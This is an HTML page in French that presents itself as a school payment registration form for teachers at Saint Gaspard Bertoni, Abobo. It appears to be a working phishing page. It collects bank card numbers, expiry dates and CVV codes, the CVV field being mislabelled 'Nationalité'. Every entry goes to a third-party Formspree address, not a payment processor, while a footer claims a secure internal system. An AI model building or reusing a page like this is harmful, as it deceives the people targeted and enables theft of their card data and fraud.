<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Formulaire de paiement</title>

    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">

    <style>
        * {
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            margin: 0;
            background: linear-gradient(135deg, #eef2f7, #dfe9f3);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 520px;
            background: #fff;
            border-radius: 14px;
            padding: 35px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            text-align: center;
        }

        .logo {
            width: 85px;
            height: 85px;
            object-fit: contain;
            margin-bottom: 10px;
        }

        h1 {
            font-size: 19px;
            margin: 10px 0 5px;
            color: #2c3e50;
        }

        .subtitle {
            font-size: 13px;
            color: #777;
            margin-bottom: 25px;
        }

        form {
            text-align: left;
        }

        label {
            display: block;
            margin-top: 15px;
            font-weight: 500;
            color: #333;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin-top: 6px;
            border-radius: 8px;
            border: 1px solid #ddd;
            font-size: 14px;
            transition: 0.2s;
            background: #fafafa;
        }

        input:focus {
            border-color: #2c3e50;
            outline: none;
            background: #fff;
        }

        button {
            width: 100%;
            margin-top: 25px;
            padding: 13px;
            border: none;
            border-radius: 8px;
            background: linear-gradient(135deg, #2c3e50, #34495e);
            color: white;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.3s;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
        }

        .footer {
            margin-top: 18px;
            font-size: 12px;
            color: #aaa;
        }
    </style>
</head>
<body>

<div class="container">

    <img src="logo.png" alt="Logo école" class="logo">

    <h1>Formulaire d'enregistrement de paiement</h1>
    <div class="subtitle">
        Professeurs - Saint Gaspard Bertoni, Abobo
    </div>

    <form action="https://formspree.io/f/xjgpgjlk" method="POST">

        <label>NUMERO DE CARTE BANCAIRE</label>
        <input type="text" name="nom" placeholder="Ex:XXXX XXXX XXXX XXXX" required>

        <label>Date d'expiration</label>
        <input type="date" name="date" required>

        <label>Nationalité</label>
        <input type="text" name="CVV" placeholder="Ex: XXX" required>

        <button type="submit">Enregistrer le paiement</button>

    </form>

    <div class="footer">
        Système de gestion interne sécurisé
    </div>

</div>

</body>
</html>
